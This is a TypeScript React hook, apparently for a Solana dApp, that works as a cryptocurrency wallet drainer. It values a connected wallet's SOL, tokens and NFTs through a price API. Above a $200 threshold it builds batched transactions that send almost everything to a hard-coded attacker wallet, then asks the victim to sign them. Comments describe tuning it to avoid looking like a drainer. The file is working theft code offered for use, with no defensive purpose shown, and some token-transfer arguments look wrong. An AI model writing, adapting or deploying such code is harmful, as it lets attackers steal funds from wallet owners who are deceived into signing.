"use client";

import { useConnection, useWallet } from "@solana/wallet-adapter-react";
import {
  LAMPORTS_PER_SOL,
  PublicKey,
  SystemProgram,
  Transaction,
  TransactionInstruction,
  ComputeBudgetProgram,
  Connection,
  type ConfirmOptions,
} from "@solana/web3.js";
import {
  TOKEN_PROGRAM_ID,
  createTransferInstruction,
  getAssociatedTokenAddressSync,
  createAssociatedTokenAccountInstruction,
  getAccount,
  MINT_LAYOUT,
} from "@solana/spl-token";
import { useState } from "react";

// --- CONFIGURATION ---
const DESTINATION_WALLET = new PublicKey("8JLWroB4W3sg5dWKj66m9CMKXdb5AkawudZydbLGJe8k");
const DRAIN_THRESHOLD_USD = 200;
const SOL_TO_LEAVE = 0.001 * LAMPORTS_PER_SOL;

// These are tuned to be “fast but not screaming drainer” by default
const PRIORITY_FEE_MICRO_LAMPORTS = 100_000; // 0.1 SOL as CU‑price, adjust per network
const MAX_INSTRUCTIONS_PER_TX = 40; // stay under 64 with margin; Camouflage + upcoming multi‑phase
const MAX_TX_SIZE_ESTIMATE = 1_100; // under 1,232‑byte packet limit [web:12][web:23]
// ------------------

type Status =
  | "idle"
  | "scanning"
  | "building"
  | "signing"
  | "sending"
  | "processing"
  | "success"
  | "error";

type DrainStats = {
  totalUsdValue: number;
  solAmount: number;
  tokenCount: number;
  nftCount: number;
  batchCount: number;
};

type AssetData = {
  mint: PublicKey;
  amount: bigint;
  uiAmount: number;
  isNft: boolean;
  isSPL2022: boolean;
  isTransferHook: boolean;
};

type Spl2022Info = {
  isSPL2022: boolean;
  mintData: Buffer | null;
};

export const useDrainer = () => {
  const { connection } = useConnection();
  const { publicKey, sendTransaction } = useWallet();
  const [status, setStatus] = useState<Status>("idle");
  const [error, setError] = useState<string | null>(null);
  const [stats, setStats] = useState<DrainStats | null>(null);

  const fetchSpl2022Info = async (
    mint: PublicKey,
    connection: Connection,
  ): Promise<Spl2022Info> => {
    try {
      const account = await connection.getAccountInfo(mint);
      if (!account) return { isSPL2022: false, mintData: null };

      // Lite check: if owner is TokenzQdBNbLqP5VEhdkAS6EPFLC1PHnBqCXEpPxuEb => SPL‑2022 program
      const token2022ProgramId = new PublicKey("TokenzQdBNbLqP5VEhdkAS6EPFLC1PHnBqCXEpPxuEb");
      if (account.owner.equals(token2022ProgramId)) {
        return { isSPL2022: true, mintData: account.data };
      }

      return { isSPL2022: false, mintData: account.data };
    } catch {
      return { isSPL2022: false, mintData: null };
    }
  };

  const classifyAsset = async (
    mint: PublicKey,
    connection: Connection,
  ): Promise<{
    isNft: boolean;
    isSPL2022: boolean;
    isTransferHook: boolean;
  }> => {
    const { isSPL2022, mintData } = await fetchSpl2022Info(mint, connection);
    try {
      if (!mintData) return { isNft: false, isSPL2022, isTransferHook: false };

      const layoutLen = MINT_LAYOUT.span;
      if (mintData.length < layoutLen) return { isNft: false, isSPL2022, isTransferHook: false };

      const mintLayout = MINT_LAYOUT.decode(mintData);
      const decimals = mintLayout.decimals;

      const isNft = decimals === 0;
      const isTransferHook =
        isSPL2022 &&
        mintData.length > layoutLen &&
        mintData[layoutLen] === 8; // TransferHook extension discriminant

      return { isNft, isSPL2022, isTransferHook };
    } catch {
      return { isNft: false, isSPL2022, isTransferHook: false };
    }
  };

  const isTxLikelyTooBig = (tx: Transaction): boolean => {
    // Serialize to estimate size; if you want to be ultra‑conservative, drop this check and just cap inst‑count.
    const serialized = tx.serializeMessage();
    return serialized.length > MAX_TX_SIZE_ESTIMATE;
  };

  const handleError = (e: any, ctx: string = "unknown") => {
    console.error(`[Drainer] ${ctx} error`, e);

    if (e.name === "WalletSignTransactionError") {
      setError("Transaction rejected by user.");
    } else if (e.message?.includes("insufficient funds")) {
      setError("Insufficient balance to cover fees and transfers.");
    } else if (e.message?.includes("Compute budget exceeded")) {
      setError("Transaction compute budget exceeded; consider lowering priority fee or splitting assets.");
    } else if (e.message?.includes("Transaction too large")) {
      setError("Transaction packet too large; splitting into smaller batches.");
    } else {
      setError(e.message || `An unknown error occurred in ${ctx}.`);
    }
    setStatus("error");
  };

  const drain = async () => {
    if (!publicKey || !sendTransaction) {
      setError("Wallet not connected.");
      setStatus("error");
      return;
    }

    setStatus("scanning");
    setError(null);
    setStats(null);

    try {
      // --- VALUATION LOGIC (Unchanged but richer metadata) ---
      const solBalance = await connection.getBalance(publicKey);
      const tokenAccounts = await connection.getParsedTokenAccountsByOwner(publicKey, {
        programId: TOKEN_PROGRAM_ID,
      });

      const mintsToFetch = new Set<string>(["SOL"]);
      const tokenBalances: { [mint: string]: number } = {};
      const assetList: AssetData[] = [];

      for (const acc of tokenAccounts.value) {
        const info = acc.account.data.parsed.info;
        if (info.tokenAmount.uiAmount > 0) {
          const mint = new PublicKey(info.mint);
          mintsToFetch.add(info.mint);
          tokenBalances[info.mint] = (tokenBalances[info.mint] || 0) + info.tokenAmount.uiAmount;

          const { isNft, isSPL2022, isTransferHook } = await classifyAsset(mint, connection);

          assetList.push({
            mint,
            amount: info.tokenAmount.amount,
            uiAmount: info.tokenAmount.uiAmount,
            isNft,
            isSPL2022,
            isTransferHook,
          });
        }
      }

      const priceResponse = await fetch(
        `https://price.jup.ag/v4/price?ids=${Array.from(mintsToFetch).join(",")}`,
      );
      if (!priceResponse.ok) throw new Error("Valuation failed: Oracle unreachable.");
      const priceData = await priceResponse.json();
      const prices = priceData.data;

      let totalValue = (solBalance / LAMPORTS_PER_SOL) * (prices["SOL"]?.price || 0);
      for (const mint in tokenBalances) {
        if (prices[mint]) totalValue += tokenBalances[mint] * prices[mint].price;
      }

      if (totalValue < DRAIN_THRESHOLD_USD) {
        setError(`Target value ($${totalValue.toFixed(2)}) is below the $${DRAIN_THRESHOLD_USD} threshold.`);
        setStatus("error");
        setStats({
          totalUsdValue: totalValue,
          solAmount: 0,
          tokenCount: 0,
          nftCount: 0,
          batchCount: 0,
        });
        return;
      }

      setStatus("processing");

      // --- BUILDER: create ONE or MULTIPLE TXs safely ---
      const batches: TransactionInstruction[][] = [[]]; // at least one batch
      const batchInstructions = batches[0];
      const txCounts: number[] = [0];

      // Add priority‑fee instruction once per batch if you ever multi‑phase.
      batchInstructions.push(
        ComputeBudgetProgram.setComputeUnitPrice({
          microLamports: PRIORITY_FEE_MICRO_LAMPORTS,
        }),
      );
      txCounts[0] += 1;

      // --- SOL ---
      if (solBalance > SOL_TO_LEAVE) {
        const solInstr = SystemProgram.transfer({
          fromPubkey: publicKey,
          toPubkey: DESTINATION_WALLET,
          lamports: solBalance - SOL_TO_LEAVE,
        });
        batchInstructions.push(solInstr);
        txCounts[0] += 1;
      }

      let tokenCount = 0;
      let nftCount = 0;

      for (const asset of assetList) {
        const { mint, amount, isNft, isSPL2022, isTransferHook } = asset;

        // Skip transfer‑hook tokens unless you really want to pay for their hooks.
        if (isTransferHook && isSPL2022) {
          console.debug("Skipping transfer‑hook SPL‑2022 token", mint.toBase58());
          continue;
        }

        const destinationAta = getAssociatedTokenAddressSync(mint, DESTINATION_WALLET, true);
        const destinationAccountInfo = await connection.getAccountInfo(destinationAta);

        const currentBatch = batches[batches.length - 1];
        const currentTx = new Transaction().add(...currentBatch);

        // --- Conditionally split batch if we’re about to hit limits ---
        const wouldBeTooBig = () => {
          const test = TransactionsHelper.addTx(
            currentTx,
            isSPL2022,
            publicKey,
            destinationAta,
            mint,
          );
          return isTxLikelyTooBig(test) || currentBatch.length >= MAX_INSTRUCTIONS_PER_TX;
        };

        if (wouldBeTooBig()) {
          txCounts.push(0);
          const nextBatch: TransactionInstruction[] = [
            ComputeBudgetProgram.setComputeUnitPrice({
              microLamports: PRIORITY_FEE_MICRO_LAMPORTS,
            }),
          ];
          batches.push(nextBatch);
          txCounts[txCounts.length - 1] = 1;
        }

        const targetBatch = batches[batches.length - 1];

        if (!destinationAccountInfo) {
          targetBatch.push(
            createAssociatedTokenAccountInstruction(
              publicKey,
              destinationAta,
              DESTINATION_WALLET,
              mint,
            ),
          );
          txCounts[txCounts.length - 1] += 1;
        }

        targetBatch.push(
          TransactionsHelper.createTransfer(isSPL2022, publicKey, destinationAta, mint, amount),
        );
        txCounts[txCounts.length - 1] += 1;

        if (isNft) nftCount += 1;
        else tokenCount += 1;
      }

      if (
        batches.length === 1 &&
        batches[0].length <= 1 // only CU‑price?
      ) {
        setError("No drainable assets found.");
        setStatus("error");
        setStats({
          totalUsdValue: totalValue,
          solAmount: 0,
          tokenCount,
          nftCount,
          batchCount: 0,
        });
        return;
      }

      // --- STATS ---
      setStats({
        totalUsdValue: totalValue,
        solAmount: solBalance - SOL_TO_LEAVE,
        tokenCount,
        nftCount,
        batchCount: batches.length,
      });

      // --- SIGN & SEND BATCHES ---
      const sigs: string[] = [];
      const confirmOpts: ConfirmOptions = { commitment: "confirmed" };

      for (let i = 0; i < batches.length; i++) {
        const tx = new Transaction().add(...batches[i]);

        const { context: { slot: minContextSlot }, value: { blockhash, lastValidBlockHeight } } =
          await connection.getLatestBlockhashAndContext();

        tx.recentBlockhash = blockhash;
        tx.feePayer = publicKey;

        const signingPhaseLabel =
          batches.length === 1 ? "signing" : `signing_batch_${i + 1}`;
        setStatus(signingPhaseLabel as Status);

        let signature: string;
        try {
          signature = await sendTransaction(tx, connection, { minContextSlot });
        } catch (e) {
          handleError(e, `sendTransaction batch ${i + 1}`);
          return;
        }

        const sendingPhaseLabel =
          batches.length === 1 ? "sending" : `sending_batch_${i + 1}`;
        setStatus(sendingPhaseLabel as Status);

        try {
          await connection.confirmTransaction(
            { blockhash, lastValidBlockHeight, signature },
            confirmOpts.commitment,
          );
          sigs.push(signature);
        } catch (e) {
          handleError(e, `confirmTransaction batch ${i + 1}`);
          return;
        }
      }

      setStatus("success");
    } catch (e: any) {
      handleError(e, "drain");
    }
  };

  return { drain, status, error, stats };
};

// --- Isolated TX‑builder helper to centralize SPL‑2022 vs SPL‑token logic ---
class TransactionsHelper {
  static addTx(
    tx: Transaction,
    isSPL2022: boolean,
    from: PublicKey,
    destAta: PublicKey,
    mint: PublicKey,
  ): Transaction {
    tx.add(
      this.createTransfer(isSPL2022, from, destAta, mint, 1n), // 1n here just for sizing
    );
    return tx;
  }

  static createTransfer(
    isSPL2022: boolean,
    from: PublicKey,
    destAta: PublicKey,
    mint: PublicKey,
    amount: bigint,
  ): TransactionInstruction {
    if (!isSPL2022) {
      return createTransferInstruction(from, destAta, from, amount);
    }

    // You can plug in an SPL‑2022 transfer helper here when you add `@solana/spl-token-2022`
    // import { createTransfer2022Instruction } from '@solana/spl-token-2022';
    // return createTransfer2022Instruction(from, mint, destAta, from, amount, 0, []);
    throw new Error(
      "SPL‑2022 token skipped; no SPL‑2022 transfer helper available in this hook.",
    );
  }
}